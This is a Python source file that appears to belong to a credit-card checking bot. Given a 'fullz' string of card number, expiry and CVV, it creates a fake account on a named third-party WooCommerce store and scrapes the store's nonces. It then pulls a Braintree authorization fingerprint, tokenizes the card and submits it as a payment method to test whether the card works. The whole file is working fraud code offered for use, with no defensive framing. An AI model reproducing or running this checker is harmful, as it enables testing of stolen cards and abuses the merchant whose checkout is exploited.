import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
from bs4 import BeautifulSoup
from requests import Session


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


async def create_braintree_auth(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        url = "medicalmonks.com"  # Example URL

        # 1. Fetching the client token from `Checker B3.py`
        session = Session()
        response = session.get(f'https://{url}/my-account/')
        rnonce = re.search(r'"woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

        data = {
            'username': f'criehs4d{random.randint(584, 5658)}',
            'email': f'criehs4d{random.randint(584, 5658)}@gmail.com',
            'password': 'ZeqWwhggxkgsP4p',
            'woocommerce-register-nonce': rnonce,
            '_wp_http_referer': '/my-account/?action=register',
            'register': 'Register',
        }

        session.post(f'https://{url}/my-account/', data=data)
        response = session.get(f'https://{url}/my-account/payment-methods/')
        cnonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': cnonce,
        }

        response = session.post(f'https://{url}/wp-admin/admin-ajax.php', data=data)
        encoded_data = response.json()['data']
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
        auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', decoded_data).group(1)

        # 2. Tokenizing the credit card
        headers = {
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '3702b387-b798-4a86-a417-bb80fdbfc0ae',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = session.post('https://payments.braintree-api.com/graphql', json=json_data, headers=headers)
        token = response.json()['data']['tokenizeCreditCard']['token']

        # 3. Using the token for payment
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
        }

        data = {
            'payment_method': 'braintree_credit_card',
            'wc_braintree_credit_card_payment_nonce': token,
        }

        response = session.post(f'https://{url}/my-account/add-payment-method/', headers=headers, data=data)
        return response.text

    except Exception as e:
        return str(e)
